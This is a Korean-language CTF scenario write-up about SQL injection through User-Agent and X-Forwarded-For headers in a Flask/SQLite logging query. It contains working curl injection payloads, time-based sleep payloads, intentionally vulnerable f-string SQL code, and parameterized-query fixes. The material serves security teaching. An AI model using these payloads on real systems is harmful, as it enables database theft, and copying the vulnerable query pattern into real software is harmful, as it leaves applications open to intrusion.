---
title: SQL Injection in HTTP Headers (Logging Query) — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, sql-injection, http-headers, logging-bypass, injection]
confidence: high
---

# SQL Injection in HTTP Headers (Logging Query) — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Traffic Analytics Monitor (트래픽 분석 모니터)
- **난이도**: Medium
- **핵심 컨셉**: 웹 애플리케이션의 일반 폼 입력이 아닌 **HTTP 헤더(Header)** 입력값을 대상으로 하는 **SQL 인젝션** 문제입니다. 웹 서버는 방문 통계 관리를 위해 매 요청 시마다 브라우저의 `User-Agent` 및 프록시 경유 IP 주소인 `X-Forwarded-For` 헤더 정보를 읽어 로그 테이블(INSERT 쿼리)에 삽입합니다. 개발자는 외부 양식 입력에만 취약점 방어 필터를 달아두고, 브라우저가 자동 매핑하는 HTTP 헤더는 조작될 수 없다고 신뢰하여 정화되지 않은 헤더 문자열을 쿼리에 그대로 결합시켰습니다. 공격자는 이를 겨냥해 패킷 헤더에 SQL Injection 구문을 실어 보내 플래그를 덤프해 냅니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **Frontend / Portal**: 일반 방문객용 메인 페이지.
- **Backend Service (Python/Flask with SQLite)**:
  - 메인 페이지 로드 시 `request.headers.get('User-Agent')` 및 `request.headers.get('X-Forwarded-For')` 획득.
  - 로그 파일 수집용 `INSERT INTO logs (user_agent, ip_address) VALUES ('[UA]', '[IP]')` 구동.
- **Flag 위치**:
  - `secrets` 테이블 내 `flag_text` 컬럼.

### 2.2 취약점 지점
1. **Header Query Injection**:
   - `User-Agent`나 `X-Forwarded-For` 값은 HTTP 클라이언트(Python requests, curl 등)에 의해 임의로 자유롭게 변조될 수 있습니다.
   - 백엔드가 이 헤더를 매개변수화하지 않은 로우(Raw) SQL 결합으로 데이터베이스에 넘겨, 데이터베이스 엔진 내에 SQL 구문 해석 오류가 성립합니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 / 헤더 | 메소드 | 인증 | 입력 값 | 반환 값 | 비고 |
|-------------------|--------|------|---------|---------|------|
| `/` (메인 경로) | GET | 없음 | Header: `User-Agent`, `X-Forwarded-For` | 메인 페이지 HTML | 헤더 취약점 주입 지점 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. 취약점 진단 및 에러 관찰
공격자는 HTTP 요청 패킷의 `User-Agent` 헤더에 홀따옴표(`'`)를 강제 삽입해 반응을 관찰합니다.
- *curl 전송 테스트*:
  ```bash
  curl http://analytics.challenge.local/ -H "User-Agent: Mozilla/5.0 '"
  ```
- *결과*: `500 Internal Server Error` 반환. 에러 메시지나 지연 등을 통해 데이터베이스 파싱 오류가 남을 확인합니다.

### Step 2. INSERT SQLi 구문 조작 및 데이터 탈취 유도
백엔드 내부의 쿼리가 다음과 같다고 가정합니다:
`INSERT INTO logs (user_agent, ip_address) VALUES ('[UA]', '[IP]')`

공격자는 `User-Agent` 영역에 홀따옴표를 넣어 괄호를 닫고, 두 번째 밸류 자리나 서브쿼리를 삽입해 정보를 빼냅니다.
- **공격 페이로드 설계 (User-Agent)**:
  `' , (SELECT flag_text FROM secrets LIMIT 1)) --`
- *대입 결과 완성형 SQL*:
  ```sql
  INSERT INTO logs (user_agent, ip_address) VALUES ('' , (SELECT flag_text FROM secrets LIMIT 1)) --', '[IP]')
  ```
  *(참고: SQLite의 경우 INSERT에 SELECT문이 결합되어 로그 테이블에 직접 플래그 텍스트가 저장되도록 유도합니다. 그 후 로그를 볼 수 있는 웹 페이지나 오류 메세지를 통해 이를 확인합니다. 만약 화면 노출이 차단되어 있다면 Time-based SQLi로 전환합니다.)*

- **Time-based SQLi 페이로드 설계 (X-Forwarded-For 또는 User-Agent)**:
  `' || (SELECT LIKE('~', pg_sleep(5))) || '` (PostgreSQL 예시)
  `' + (SELECT case when (1=1) then sqlite3_sleep(5000) else 0 end) + '` (SQLite용 extension sleep 등)
  또는 무거운 연산(Heavy Query)을 수행하는 지연 공격을 구성합니다.

### Step 3. 최종 요청 전송
- *공격 수행 (curl)*:
  ```bash
  curl http://analytics.challenge.local/ \
       -H "User-Agent: ', (SELECT flag_text FROM secrets LIMIT 1)) --"
  ```
  로그가 삽입되고 난 후, 내 계정의 "최근 활동 로그 확인" 페이지나 관리용 로그 뷰어 화면(`/logs`)을 방문해 봅니다.

### Step 4. flag 획득
로그 뷰어 페이지의 IP 주소 출력 영역이나 에이전트 정보 영역에 `secrets` 테이블에서 성공적으로 가로채온 플래그 값(`FLAG{sql_injection_via_http_header_logging}`)이 그대로 찍혀있는 것을 확인합니다.

---

## 5. 취약점 유발 백엔드 코드 스니펫 (Python Flask with SQLite)

```python
# app.py
from flask import Flask, request, jsonify
import sqlite3

app = Flask(__name__)

def db_init():
    conn = sqlite3.connect("analytics.db")
    cursor = conn.cursor()
    cursor.execute("CREATE TABLE IF NOT EXISTS logs (id INTEGER PRIMARY KEY, user_agent TEXT, ip_address TEXT)")
    cursor.execute("CREATE TABLE IF NOT EXISTS secrets (flag_text TEXT)")
    # 데모 플래그 삽입
    cursor.execute("INSERT INTO secrets VALUES ('FLAG{sql_injection_via_http_header_logging}')")
    conn.commit()
    conn.close()

@app.route("/")
def index():
    # HTTP 헤더 정보 수집
    user_agent = request.headers.get("User-Agent", "Unknown")
    ip_address = request.headers.get("X-Forwarded-For", request.remote_addr)
    
    conn = sqlite3.connect("analytics.db")
    cursor = conn.cursor()
    
    # 취약점 지점: 파라미터 쿼리(?)를 쓰지 않고 포맷 스트링 결합 사용
    query = f"INSERT INTO logs (user_agent, ip_address) VALUES ('{user_agent}', '{ip_address}')"
    
    try:
        cursor.execute(query)
        conn.commit()
    except Exception as e:
        # 에러 정보를 응답으로 출력하는 경우 SQLi 침투가 매우 쉬워짐
        return f"Database Error: {str(e)}", 500
    finally:
        conn.close()
        
    return "Main Page Loaded. Traffic logged."

@app.route("/logs")
def view_logs():
    # 저장된 통계 내역을 그대로 출력
    conn = sqlite3.connect("analytics.db")
    cursor = conn.cursor()
    cursor.execute("SELECT user_agent, ip_address FROM logs")
    rows = cursor.fetchall()
    conn.close()
    
    log_list = [f"Agent: {r[0]}, IP: {r[1]}" for r in rows]
    return "<br>".join(log_list)

if __name__ == "__main__":
    db_init()
    app.run(host="0.0.0.0", port=5000)
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **헤더 값에 대해서도 반드시 매개변수화 바인딩 강제**:
   - `User-Agent`나 `X-Forwarded-For` 역시 사용자로부터 유입되는 완전히 신뢰 불가능한 데이터(Untrusted Input)이므로 예외 없이 플레이스홀더(`?` 또는 `%s`) 바인딩을 기입하여 컴파일합니다.
   - **수정 예시**:
     ```python
     # 플레이스홀더 결합
     query = "INSERT INTO logs (user_agent, ip_address) VALUES (?, ?)"
     cursor.execute(query, (user_agent, ip_address))
     ```
2. **에러 노출 금지 (Error Masking)**:
   - 프로덕션 배포 시에는 세부 데이터베이스 에러 코드가 웹 페이지 응답으로 반환되지 않도록 차단하고 예외 처리를 일반화(Generic Error)합니다.
